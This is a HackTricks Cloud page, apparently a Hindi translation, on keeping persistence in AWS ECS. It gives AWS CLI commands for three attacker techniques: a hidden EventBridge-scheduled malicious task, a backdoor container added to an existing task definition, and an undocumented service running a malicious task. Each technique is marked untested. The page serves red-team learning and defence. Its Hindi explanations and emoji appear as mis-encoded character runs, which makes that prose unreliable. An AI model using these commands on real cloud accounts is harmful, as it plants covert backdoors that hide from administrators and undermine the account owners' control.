# AWS - ECS Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ECS

For more information check:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### Hidden Periodic ECS Task

{% hint style="info" %}
TODO: Test
{% endhint %}

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ Amazon EventBridge ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§õ‡§ø‡§™‡•Ä ‡§π‡•Å‡§à ‡§Ü‡§µ‡§ß‡§ø‡§ï ECS ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø **‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡•ã ‡§Ü‡§µ‡§ß‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§®‡•Å‡§∏‡•Ç‡§ö‡•Ä ‡§¨‡§®‡§æ‡§à ‡§ú‡§æ ‡§∏‡§ï‡•á**‡•§ ‡§Ø‡§π ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§Ö‡§®‡•ç‡§µ‡•á‡§∑‡§£ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§æ‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§Ø‡§æ AWS ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§∞‡§§‡§æ ‡§¨‡§®‡§æ‡§è ‡§∞‡§ñ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
```bash
# Create a malicious task definition
aws ecs register-task-definition --family "malicious-task" --container-definitions '[
{
"name": "malicious-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
}
]'

# Create an Amazon EventBridge rule to trigger the task periodically
aws events put-rule --name "malicious-ecs-task-rule" --schedule-expression "rate(1 day)"

# Add a target to the rule to run the malicious ECS task
aws events put-targets --rule "malicious-ecs-task-rule" --targets '[
{
"Id": "malicious-ecs-task-target",
"Arn": "arn:aws:ecs:region:account-id:cluster/your-cluster",
"RoleArn": "arn:aws:iam::account-id:role/your-eventbridge-role",
"EcsParameters": {
"TaskDefinitionArn": "arn:aws:ecs:region:account-id:task-definition/malicious-task",
"TaskCount": 1
}
}
]'
```
### Backdoor Container in Existing ECS Task Definition

{% hint style="info" %}
TODO: Test
{% endhint %}

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ECS ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ ‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§õ‡§ø‡§™‡§æ ‡§π‡•Å‡§Ü ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§µ‡•à‡§ß ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ö‡§≤‡§§‡§æ ‡§π‡•à‡•§ ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§∏‡•ç‡§•‡§ø‡§∞‡§§‡§æ ‡§î‡§∞ ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ó‡§§‡§ø‡§µ‡§ø‡§ß‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
```bash
# Update the existing task definition to include the backdoor container
aws ecs register-task-definition --family "existing-task" --container-definitions '[
{
"name": "legitimate-container",
"image": "legitimate-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
},
{
"name": "backdoor-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": false
}
]'
```
### Undocumented ECS Service

{% hint style="info" %}
TODO: Test
{% endhint %}

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï **undocumented ECS service** ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ö‡§≤‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§á‡§ö‡•ç‡§õ‡§ø‡§§ ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§ï‡•ã ‡§®‡•ç‡§Ø‡•Ç‡§®‡§§‡§Æ ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§ï‡•á ‡§î‡§∞ ‡§≤‡•â‡§ó‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡§ï‡•á, ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡•á‡§µ‡§æ ‡§ï‡•ã ‡§®‡•ã‡§ü‡§ø‡§∏ ‡§ï‡§∞‡§®‡§æ ‡§ï‡§†‡§ø‡§® ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
```bash
# Create a malicious task definition
aws ecs register-task-definition --family "malicious-task" --container-definitions '[
{
"name": "malicious-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
}
]'

# Create an undocumented ECS service with the malicious task definition
aws ecs create-service --service-name "undocumented-service" --task-definition "malicious-task" --desired-count 1 --cluster "your-cluster"
```
{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **‡§π‡§Æ‡§æ‡§∞‡§æ ‡§Ö‡§®‡•Å‡§∏‡§∞‡§£ ‡§ï‡§∞‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
